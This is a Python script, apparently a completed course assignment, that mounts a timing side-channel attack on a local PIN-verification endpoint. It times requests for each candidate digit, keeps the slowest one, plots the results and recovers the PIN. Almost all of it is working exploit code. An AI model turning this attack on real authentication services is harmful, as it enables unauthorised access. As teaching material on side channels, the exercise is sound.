import sys
import time
import requests
import matplotlib.pyplot as plt
import os

# Target configuration
URL = "http://127.0.0.1:5000/verify"
STUDENT_ID = "098"  # TODO: Put your student id (last 3 digits)
HEADERS = {"X-Student-ID": STUDENT_ID, "Content-Type": "application/json"}

# Attack configuration parameters
PIN_LENGTH = 4
SAMPLES_PER_GUESS = 1  # Number of samples per digit to average out noise
DIGITS = "0123456789"
COLLECT_ALL_DATA = False


def measure_response_time(candidate_pin: str) -> float:
  """Sends a request to the target server and returns the elapsed time in milliseconds."""
  start_time = time.perf_counter()
  try:
    response = requests.post(
        URL, json={"pin": candidate_pin}, headers=HEADERS, timeout=5
    )
    elapsed_ms = (time.perf_counter() - start_time) * 1000
    return elapsed_ms, response.status_code
  except requests.RequestException as e:
    print(f"\n[!] Error connecting to target server: {e}")
    sys.exit(1)


def get_average_timing(candidate_pin: str, samples: int) -> tuple[float, bool]:
  """Averages response times across multiple samples to smooth out system noise."""
  
  # TODO: Request sample number of times and return average elapsed time and whether the request was a success
  # print(f"samples: {samples}")
  
  total_time = 0.0
  success = False

  for _ in range(samples):
    elapsed, status = measure_response_time(candidate_pin=candidate_pin)
    total_time+=elapsed
    if status == 200:
      success = True
  avg_time = total_time/samples
    
  return avg_time, success

def plot_timings(position, timings, known_prefix=""):

  labels = []
  for d in timings.keys():
    labels.append(known_prefix+d+"0"*(PIN_LENGTH-len(known_prefix)-1))
  # print(labels)

  # digit = list(timings.keys())
  timing = list(timings.values())

  plt.figure(figsize=(16,9))
  # plt.bar(
  #   x=digit,
  #   height=timing,
  #   color='lightgreen',
  #   edgecolor='black'
  # )
  plt.barh(
    y = labels,
    width=timing,
    color = 'lightgreen',
    edgecolor='black',
    height=0.6
  )
  plt.gca().invert_yaxis()
  plt.gca().xaxis.set_major_formatter(plt.FuncFormatter(lambda x, _: f'{int(x)}ms'))
  plt.ylabel(
    'Candidate Digits'
  )
  plt.xlabel(
    'Avg Response Time (ms)'
  )
  plt.title(
    f'Timing analysis for position {position+1}'
  )
  plt.grid(
    axis='x',
    linestyle='--',
    alpha=0.7
  )
  # plt.legend()

  sample_str = ""
  if SAMPLES_PER_GUESS > 0 and SAMPLES_PER_GUESS < 10:
    sample_str += '0' 
  sample_str += str(SAMPLES_PER_GUESS)
  # print(sample_str)
  
  os.makedirs('results', exist_ok=True)
  figname = f'results/{sample_str}_position_{position+1}_timing_diagram.png'
  plt.savefig(
    figname
  )
  print(f"[*] plot saved as {figname}")

  plt.close()

def recover_secret_pin():
  print("=" * 60)
  print(f" Starting Timing Attack Exploit against {URL}")
  print(f" Target Student ID : {STUDENT_ID}")
  print(f" Samples per guess : {SAMPLES_PER_GUESS}")
  print("=" * 60 + "\n")
  
  known_prefix = ""

  # TODO: Use the methods to build up the secret pin

  for position in range(PIN_LENGTH):
    print("-" * 60)
    print(f"[*] Testing Position {position+1}...")
    timings = {}
    best_digit = None
    max_timing = -1.0
    found_pin = False
    correct_candidate = None

    for curr_digit in DIGITS:
      candidate_pin = known_prefix + curr_digit + "0" * (PIN_LENGTH - len(known_prefix) - 1)

      avg_time, success = get_average_timing(candidate_pin=candidate_pin, samples=SAMPLES_PER_GUESS)
      # print(f"success for position={position+1}, and digit={curr_digit} : {success}")

      timings[curr_digit] = avg_time

      print(f"\tCandidate PIN: '{candidate_pin}' => AVG TIME: {avg_time:.2f} ms")

      if success:
        best_digit = curr_digit
        found_pin = success
        correct_candidate = candidate_pin
        # break

      if not found_pin and avg_time > max_timing:
        # update max
        max_timing = avg_time
        best_digit = curr_digit
    
    plot_timings(position=position, timings=timings, known_prefix=known_prefix)
    if best_digit is None:
      best_digit = '0'
    known_prefix += best_digit
    print(f"[+] Append digit: '{best_digit}'.")
    print(f"[+] Prefix so far: '{known_prefix}'.")
    if found_pin:
      print(f"[+] HTTP 200 OK detected at candidate: '{correct_candidate}'")
      if not COLLECT_ALL_DATA:
        known_prefix = correct_candidate
        break
    print("-" * 60 + "\n")


  # Final verification check
  print("[*] Verifying recovered PIN with server...")
  avg_time, is_success = get_average_timing(known_prefix, samples=1)
  if is_success:
    print("\n" + "=" * 60)
    print(f"[+] VERIFIED! Recovered PIN: {known_prefix}")
    print("=" * 60)
  else:
    print("\n[-] Failed to verify recovered PIN. Consider increasing SAMPLES_PER_GUESS.")


if __name__ == "__main__":
  recover_secret_pin()